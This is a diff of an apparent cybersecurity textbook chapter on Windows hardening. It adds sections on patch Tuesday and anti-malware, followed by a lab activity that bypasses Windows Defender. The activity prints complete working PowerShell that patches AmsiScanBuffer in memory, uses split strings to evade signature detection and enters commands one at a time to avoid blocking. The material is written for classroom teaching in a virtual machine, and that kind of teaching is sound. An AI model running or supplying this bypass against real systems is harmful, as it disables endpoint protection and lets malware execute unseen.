@@ -493,20 +493,86 @@ Hives contain folders and entries as key value pairs using a data types.  We exp
 Malware can abuse the Registry by hiding data and within it used to obfuscate its activity.  The registry can even be used as a persistence mechanism which we will explore further in the next chapter.
 ### Hardening
 Windows hardening follows the same concept as what we explored in the Linux section of this chapter.  Administrators should seek to limit the applications and services installed on a device alongside restricting access as prudent.  Previous chapters we touched upon the host firewall built into the operating system and observed the dangers of disabling it exposing services to the network.  Windows too has security configurations that can be scanned using baseline solutions and those configurations can be more restrictive such as setting password policies.
-
+#### Windows Patching
 The Windows operating system is so large, dynamic, and built using legacy code that new security vulnerabilities are constantly being identified.  These vulnerabilities range in severity and Microsoft works diligently to mitigate them using software patches, at least most of the time.  These patches become available the second Tuesday of every month to what has become known as *patch Tuesday*.  These patches include performance, feature, and security fixes with the security patches needing to be applied promptly.  
 
 > [!warning] Warning - Diffing Patches
 > As soon as a patch becomes available an arms race between system administrators and malware authors starts.  System administrators must patch their systems quickly to avoid becoming victim of malware that abuses the security vulnerability of an unpatched system.  Malware authors monitor these patch releases and will compare unpatched system files to patched system files to identify the change.  The changes are analyzed to derive the vulnerability and then new malware is developed to exploit the vulnerability.  The time from patch release to malware use abusing the vulnerability has been as fast as 1 or 2 days!
 
 Microsoft releases patches as *knowledge base (KB)* notices and deliver them through their Windows Update distribution channel.  These channels are automatically monitored by Windows versions inside of a support timeframe.  At the time of this writing Windows 7 is no longer supported an thus does not receive (usually) security updates.  Enterprises often use patch management solutions, such as the *Windows Server Update Services (WSUS)* servers, to administer patches in a controlled manner.
+#### Anti-Malware
+Another hardening activity that is most prevalent with Windows operating systems is the use of anti-malware, or *anti-virus*, solutions.  In fact, Windows comes with a free solution called **Windows Defender** which has grown into a standalone threat monitoring solution.  In the past, Defender did not have good creditability often missing obvious malware, but recent improvements on this service have been substantial and as of now is a reasonable solution for malware mitigation.  Approaches to malware mitigation have grown over time with the first iteration using hash values of malicious binaries and scanning systems searching for these files.  
 
-Another hardening activity that is most prevalent with Windows operating systems is the use of anti-malware, or *anti-virus*, solutions.  In fact, Windows comes with a free solution called **Windows Defender** which has grown into a standalone threat monitoring solution.  In the past, Defender did not have good creditability often missing obvious malware, but recent improvements on this service have been substantial and as of now is a reasonable solution for malware mitigation.  Approaches to malware mitigation have grown over time with the first iteration using hash values of malicious binaries and scanning systems searching for these files.  However, the ability to bypass these early anti-malware solutions required only a slight alteration of the malware creating a new strain.  Solutions then evolved to detect specific patterns within the malware themselves such as the use of Windows API functions and the byte order and position within the executable.  These *signature based* solutions are used today with similar patterns being used in other security systems, like IDS, that we will experiment with in later chapters.  *Behavioral based* anti-malware solutions also exist which monitor the activities of all running processes on the system looking for suspicious activities, like writing files to the system or attempting to interact with LSASS.  All of these solutions usually support monitoring and blocking of malware.  Some go as far as to remove the malware from a device when it is detected. 
+However, the ability to bypass these early anti-malware solutions required only a slight alteration of the malware creating a new strain.  Solutions then evolved to detect specific patterns within the malware themselves such as the use of Windows API functions and the byte order and position within the executable.  These *signature based* solutions are used today with similar patterns being used in other security systems, like IDS, that we will experiment with in later chapters.  *Behavioral based* anti-malware solutions also exist which monitor the activities of all running processes on the system looking for suspicious activities, like writing files to the system or attempting to interact with LSASS.  All of these solutions usually support monitoring and blocking of malware.  Some go as far as to remove the malware from a device when it is detected.  The following image was taken from VirusTotal when searching the SHA1 hash of the infamous Mimikatz password dumping tool. [^1]  It shows that 61 of 72 antivirus vendors recognize the hash of the file as malware.
+![[../images/05/virustotal.png|VirusTotal Mimikatz Detections]]
 
 > [!activity] Activity - Bypassing Defender
-> Most anti-malware and *endpoint detection and response (EDR)* solutions hook into the memory space of the every process that is started on the device.  This allows the solution to monitor the processes activity and report back to the solution for handling.  If the hook reports malicious patterns the solution kills the running process ending the malware before it has had a chance to cause impact.  However, when a user initiates an executable its code is put into the *userland* memory space where the anti-malware solution then hooks into.  The userland memory space is in complete control of the user that started the process - allowing them, or the malware, to read and write to that memory.  With this background, malware can unhook the anti-malware solution from the memory space it is running in bypassing the security control.
+> Most anti-malware and *endpoint detection and response (EDR)* solutions hook into the memory space of the every process that is started on the device.  This allows the solution to monitor the processes activity and report back to the solution for handling.  If the hook reports malicious patterns the solution kills the running process ending the malware before it has had a chance to cause impact.  However, when a user initiates an executable its code is put into the *userland* memory space where the anti-malware solution then hooks into.  The userland memory space is in complete control of the user that started the process - allowing them, or the malware, to read and write to that memory.  With this background, malware can unhook the anti-malware solution from the memory space it is running in bypassing the security control.  Instead of unhooking, the malware can also return true negative results back to the solution regardless of the process memory space's behavior.
 > 
-> I'll demonstrate how to bypass Windows Defender.
+> I'll demonstrate how to bypass Windows Defender using the Windows VM in a PowerShell session.  After starting the machine, I search for Virus & Threat Protection to launch the Defender settings.
+> ![[../images/05/win_activity_launch_defender.png|Launching Windows Defender|400]]
+> Scrolling down the Windows Security window I can see that Defender appears to be enabled and running.
+> ![[../images/05/win_activity_av_defender_running.png|Defender Up and Running|300]]
+> To demonstrate a bypass I need to execute commands in a running process so I launch a PowerShell session from the search bar.  Defender hooks into this newly created process and will monitor the memory space for malicious behavior.  I happen to know that the Windows API function `AmsiScanBuffer` will trigger Defender can kill the command as this function can be abused by malware to bypass Defender.  To test that Defender is working, I'll include this string in an echo command and observe Defender taking action.
+> ```powershell
+> echo "AmsiScanBuffer"
+> ```
+> ![[../images/05/win_activity_bypass_test.png|Testing Defender|600]]
+> Excellent, we can see that Defender detected the string and blocked the command.  Next I'll run several commands designed to replace the malicious detection result in the running process with a passing result no matter the behavior.  These bypass commands are found on S3cur3Th1sSh1t's GitHub repository Amsi-Bypass-Powershell: https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#patching-amsi-amsiscanbuffer-by-rasta-mouse. [^2] There are several bypasses, with varying degrees of effectiveness, and I'll use the Patching AMSI AmsiScanBuffer by rasta-mouse.  If I copy and paste the entire script and attempt to run it in the PowerShell process, Defender will detect it and block the activity.  Therefore, I copy and paste each command one at a time to elude detection.  The first block loads the Windows API kernel library functions needed to manipulate memory space into a variable that I'll use in commands to follow.
+> ```powershell
+> $Win32 = @"
+> 
+> using System;
+> using System.Runtime.InteropServices;
+> 
+> public class Win32 {
+> 
+>     [DllImport("kernel32")]
+>     public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+> 
+>     [DllImport("kernel32")]
+>     public static extern IntPtr LoadLibrary(string name);
+> 
+>     [DllImport("kernel32")]
+>     public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+> 
+> }
+> "@
+> 
+> Add-Type $Win32
+> ```
+>![[../images/05/win_activity_bypass_functions.png|Importing Kernel Memory Functions|600]]
+>In the next command I load the `amsi.dll` library into another variable to use later.  Notice in the command that amsi is broken up into two segments that are concatenated together.  This is to avoid the raw string that would otherwise be detected and blocked by Defender.  This, along with sever other techniques, is a common method to evade signature detection.
+>```powershell
+>$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
+>```
+>In order to patch the AmsiScanBuffer process I need to know where it is located in memory.  The GetProcAddress kernel function loaded earlier can assist by return the address of the given function.  However, as we demonstrated earlier, using the raw string will cause Defender to block the command.  Therefore, again we use the concatenate method to evade the signature detection.
+>```powershell
+>$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
+>```
+>I'll set a variable to zero that will be used in the following command to allow the AmsiScanBuffer process to be written to.
+>```powershell
+>$p = 0
+>```
+>Next, I'll set the the memory space of AmsiScanBuffer to be writable.  The command returns true indicating successful memory change!
+>```powershell
+>[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
+>```
+>In the next command I'll set a variable to hold the patch in hexadecimal that will overwrite AmsiScanBuffer to return true negatives.
+>```powershell
+>$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
+>```
+>Finally, the last command will write the patch to the AmsiScanBuffer process.  All the preceeding commands can be found in the following screenshot.
+>```powershell
+>[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
+>```
+>![[../images/05/win_activity_bypass_commands.png|Patching AmsiScanBuffer Process|600]]
+>Amsi should now be defanged for our PowerShell process.  To test its success I will rerun the echo command that was originally blocked.
+>```powershell
+>echo "AmsiScanBuffer"
+>```
+>![[../images/05/win_activity_bypass_tested.png|Testing Bypassed Defender|600]]
+>Defender didn't block the use of AmsiScanBuffer!  This means anything else ran in this PowerShell process won't be blocked by Defender.
 
 > [!exercise] Exercise - Bypassing Defender
 > Using your Windows VM in Bridge Adapter network mode, you will demonstrate an AMSI patch bypass.
@@ -526,3 +592,5 @@ Another hardening activity that is most prevalent with Windows operating systems
 > Pick another bypass method from the following link and test in a new PowerShell instance.  Can you find another method that works? 
 > https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
 
+[^1]: VirusTotal - File; February 2024; https://www.virustotal.com/gui/file/31eb1de7e840a342fd468e558e5ab627bcb4c542a8fe01aec4d5ba01d539a0fc
+[^2]: Amsi-Bypass-Powershell; GitHub S3cur3Th1sSh1t; February 2024; https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#patching-amsi-amsiscanbuffer-by-rasta-mouse
